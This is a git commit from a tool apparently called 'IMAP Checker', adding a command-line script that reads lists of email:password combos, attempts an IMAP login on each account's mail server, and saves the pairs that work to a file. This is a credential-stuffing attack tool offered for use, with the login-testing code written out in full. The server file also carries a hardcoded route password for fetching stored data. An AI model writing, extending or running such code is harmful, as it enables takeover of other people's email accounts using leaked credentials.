33543c8cb41c3a7b1c057ab648952759eae9059c
TheSpeedX <ggspeedx29@gmail.com>
2020-03-17 11:06:50 +0530

    Added CLI

---
+++ checker.py
@@ -0,0 +1,32 @@
+import argparse
+import os
+from server import *
+import re
+
+parser = argparse.ArgumentParser(description="Command Line Version of IMAP Checker")
+
+parser.add_argument('-i','--input', action='store', dest='input_file',help='File path containing the MAIL:PASS Combo')
+parser.add_argument('-v','--version', action='version', version='IMAP_Checker '+VERSION,help='Shows the Mail Checker version')
+
+results = parser.parse_args()
+input_file=results.input_file
+print("[+]\tLoading "+input_file+" ...")
+if os.path.isfile(input_file):
+	input_stream = open(input_file, 'r')
+	text = input_stream.read()
+	input_stream.close()
+	matches = re.findall("(.*@.*\..*):(.*)", text)
+print("[*]\t"+input_file+" Loaded !!!")
+print("[+]\tStarting Scan...")
+for mail,passw in matches:
+	server,port=search_server(mail.split('@')[1])
+	if server and port:
+		if imapCheck(mail,passw,server,port):
+			f=open("success.txt",'a')
+			f.write(mail+":"+passw+"\n")
+			f.close()
+			print("\t[✔]\t"+mail+":"+passw)
+		else:
+			print("[❌]\t"+mail+":"+passw)
+	else:
+		print("[❌] Bad Format")
--- server.py
+++ server.py
@@ -7,10 +7,9 @@ import sqlite3
 from sqlite3 import Error
 
 app = Flask(__name__)
-
 PASSWORD="5tr0ng_P@ssW0rD"
-
 database = "firebase.db"
+VERSION='v2.0'
 
 def create_connection(db_file):
 	conn = None
@@ -50,7 +49,7 @@ def index():
         }
         </style>
 	<body style="background:#000000">
-  <div class="centered-text"><h1><font color="#00ff00"><u>This is a simple IMAP Checker By SpeedX</u></font></h1></div></body></html>"""
+  <div class="centered-text"><h1><font color="#00ff00"><u>This is a simple IMAP Checker By SpeedX """+VERSION+"""</u></font></h1></div></body></html>"""
 
 @app.route('/fetch/'+PASSWORD)
 def fetch():
@@ -171,13 +170,13 @@ function redirect(){
   
 def imapCheck(email, password, imapServerName, port):	
 	try:
-		print('Trying %s' % password)
+		#print('Trying %s' % password)
 		M = imaplib.IMAP4_SSL(imapServerName,int(port))
 		M.login(email, password)
 		# ssl= (port == 993)
 		# server = imapclient.IMAPClient(imapServerName,port=port, ssl=ssl)
 		# server.login(email, password)
-		print('Success! %s' % password)
+		#print('Success! %s' % password)
 		return True
 	except Exception as exception:
 		print(exception)
